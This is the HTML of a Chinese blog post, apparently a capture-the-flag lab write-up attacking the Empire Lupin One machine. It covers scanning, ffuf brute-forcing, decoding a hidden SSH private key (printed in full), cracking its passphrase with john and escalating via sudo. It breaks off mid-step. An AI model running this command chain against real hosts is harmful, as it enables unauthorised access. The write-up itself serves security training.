@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>对01-Empire-Lupin-One的渗透测试 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="对01-Empire-Lupin-One的渗透测试">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/01/27/%E5%AF%B901-Empire-Lupin-One%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="信息收集主机发现命令一arp-scan-Ieth0-l（指定网卡扫）!()[&amp;#x2F;对01-Empire-Lupin-One的渗透测试&amp;#x2F;Pastedimage20260127154133.png)命令二netdiscover-ieth0-r192.168.59.0/24（netdiscover-">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">对01-Empire-Lupin-One的渗透测试</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-01-27T09:40:00.000Z">2026-01-27</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-01-27T09:43:56.452Z">2026-01-27</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><h3 id="命令一"><a href="#命令一" class="headerlink" title="命令一"></a>命令一</h3><p><code>arp-scan -I eth0 -l</code>（指定网卡扫）<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127154133.png)</p>
+<h3 id="命令二"><a href="#命令二" class="headerlink" title="命令二"></a>命令二</h3><p><code>netdiscover -i eth0 -r 192.168.59.0/24</code>（netdiscover -i 网卡-r 网段）<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127154204.png)</p>
+<h3 id="命令三"><a href="#命令三" class="headerlink" title="命令三"></a>命令三</h3><p><code>masscan 192.168.59.0/24 -p 80,22</code>（masscan 扫描的网段 -p 扫描端口号）<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127154331.png)</p>
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><code>nmap -A -sV -T4 -p- 靶机ip</code>查看靶机开放的端口<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127154420.png)</p>
+<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><h3 id="命令一-1"><a href="#命令一-1" class="headerlink" title="命令一"></a>命令一</h3><p><code>dirsearch -u 192.168.59.146</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127154645.png)</p>
+<h3 id="命令二-1"><a href="#命令二-1" class="headerlink" title="命令二"></a>命令二</h3><p><code>dirb http://192.168.59.146</code></p>
+<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>查看相关URL<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127155440.png)<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127155506.png)<br>使用 ffuf 工具暴力破解目录<br><code>ffuf -c -w /usr/share/wordlists/dirb/common.txt -u &#39;http://192.168.59.146/~FUZZ&#39;</code><br>参数解释：<br>-c 有颜色输出<br>-w 指定字典<br>-u 指定暴力破解的目录，FUZZ 就是暴力破解的目录<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127155719.png)<br>访问得到以下信息：<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127160016.png)<br>翻译一下：<br><em>你好朋友，很高兴你找到了我的秘密目录。我这样做是为了和你分享我创建的 <strong>SSH 私钥文件</strong>。<br>它就藏在这里的某个地方，这样黑客就找不到它，也就没法用 <strong>fasttrack</strong>（注：一个常用的破解字典）来破解我的密码短语（passphrase）了。<br>我很聪明，这我知道。<br>有任何问题请告诉我。<br><strong>你最好的朋友 icex64</strong></em><br>这段话的意思就是用户名为 <code>icex64</code><br>然后<code>ssh</code>私钥登陆，其私钥文件应该就藏在这个目录下<br>这可能需要暴力破解了<br>暴力破解文件使用 <code>fasttrack</code> 破解<br>尝试使用 kali 中的字典暴力破解<br><code>ffuf -c -w /usr/share/wordlists/fasttrack.txt -u &#39;http://192.168.59.146/~secret/.FUZZ&#39; -fc 403 -e .txt,.html</code><br>参数：<br>-c 颜色输出<br>-w 指定字典<br>-u 指定 URL,URL 中 FUZZ 是需要爆破的文件名<br>-fc 过滤指定的返回状态码<br>-e 逗号分隔的扩展名列表。可以指定爆破的文件扩展名<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127160446.png)<br>啥也没有，那咱们换个字典试试吧<br><code>ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u &#39;http://192.168.59.146/~secret/.FUZZ&#39; -fc 403 -e .txt,.html</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127160638.png)<br>访问得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">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</span><br></pre></td></tr></table></figure>
+<p>看着比较像 base64，使用在线网站识别算法<br><a target="_blank" rel="noopener" href="https://www.dcode.fr/cipher-identifier">https://www.dcode.fr/cipher-identifier</a><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127160908.png)<br>base58解密后得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp</span><br><span class="line">PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk</span><br><span class="line">9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9</span><br><span class="line">H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6</span><br><span class="line">xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7</span><br><span class="line">J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu</span><br><span class="line">/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0</span><br><span class="line">ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I</span><br><span class="line">he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf</span><br><span class="line">XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA</span><br><span class="line">hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb</span><br><span class="line">4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq</span><br><span class="line">mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp</span><br><span class="line">MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA</span><br><span class="line">2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb</span><br><span class="line">QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE</span><br><span class="line">vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ</span><br><span class="line">0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft</span><br><span class="line">rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB</span><br><span class="line">QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy</span><br><span class="line">x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG</span><br><span class="line">nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5</span><br><span class="line">VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO</span><br><span class="line">cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh</span><br><span class="line">nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm</span><br><span class="line">8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH</span><br><span class="line">zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw</span><br><span class="line">n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl</span><br><span class="line">AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93</span><br><span class="line">oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI</span><br><span class="line">63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV</span><br><span class="line">y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+</span><br><span class="line">t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2</span><br><span class="line">Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU</span><br><span class="line">yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI</span><br><span class="line">8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU</span><br><span class="line">mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r</span><br><span class="line">VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ</span><br><span class="line">E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ</span><br><span class="line">BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2</span><br><span class="line">yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+</span><br><span class="line">wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P</span><br><span class="line">5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8</span><br><span class="line">vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ</span><br><span class="line">Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB</span><br><span class="line">1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB</span><br><span class="line">ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC</span><br><span class="line">iUJ66WmRUN9EoVlkeCzQJwivI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>将内容复制出来保存为文件<code>ssh.key</code></p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="破解-sshkey-密码-getshell"><a href="#破解-sshkey-密码-getshell" class="headerlink" title="破解 sshkey 密码 getshell"></a>破解 sshkey 密码 getshell</h2><p>在 kali 中搜索 <code>ssh2john</code>工具<br><code>locate ssh2john</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127161601.png)<br>将 ssh.key 转为 john 能识别的 hash<br><code>/usr/share/john/ssh2john.py ssh.key &gt; hash</code><br>使用 john 破解 hash<br><code>john --wordlist=/usr/share/wordlists/fasttrack.txt hash</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127161829.png)<br>得到密码：<code>P@55w0rd!</code><br>尝试登陆 SSH<br>这里要先修改ssh.key文件的权限<br><code>chmod 600 ssh.key</code><br>原因：<br>SSH 客户端为了安全起见，要求<strong>私钥文件（ssh.key）的权限必须是严格限制的</strong>。<br>现在的 ssh.key 权限是 <strong>0644</strong>（即：文件所有者可读写，但组用户和其他用户都可读）。SSH 认为这极其不安全，因为别人可以轻易偷走你的私钥，所以它<strong>自动忽略（Ignored）了这个私钥，转而让你输入用户的密码</strong>。<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127162338.png)</p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><h2 id="寻找-suid-权限程序提权"><a href="#寻找-suid-权限程序提权" class="headerlink" title="寻找 suid 权限程序提权"></a>寻找 suid 权限程序提权</h2><p>在 shell 中寻找 suid 程序：<code>find / -perm -u=s -type f 2&gt;/dev/null</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127162532.png)<br>没有发现</p>
+<h2 id="使用-sudo-程序获取用户-arsene-的-shell"><a href="#使用-sudo-程序获取用户-arsene-的-shell" class="headerlink" title="使用 sudo 程序获取用户 arsene 的 shell"></a>使用 sudo 程序获取用户 arsene 的 shell</h2><p>在 shell 中执行命令:<code>sudo -l</code><br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127162838.png)<br>发现不需要密码可以执行 arsene 用户目录下的文件：<br><code>sudo /usr/bin/python3.9 /home/arsene/heist.py</code><br>进去看一下有什么内容<br>!()[&#x2F;对01-Empire-Lupin-One的渗透测试&#x2F;Pastedimage20260127163009.png)<br>翻译一下<br><em><strong>嗨，我的朋友 Icex64：</strong></em><br><em><strong>能请你帮我检查一下我的代码运行起来是否安全吗？我下次“行动”（heist）需要用到它。</strong></em><br><em><strong>我不希望任何其他人进入该程序，因为那可能会危及我的账户安全，并让他们发现我的秘密文件。</strong></em><br><em><strong>只有你有权限访问我的程序，因为我知道你的账户是很安全的。</strong></em><br><em><strong>期待与你在“另一端”相见。</strong></em><br><em><strong>亚森·罗宾 (Arsene Lupin)</strong></em><br>还有可以看到<code>heist.py</code>脚本本身没有什么代码，但导入了一个模块：<code>webbrowser</code><br>查找 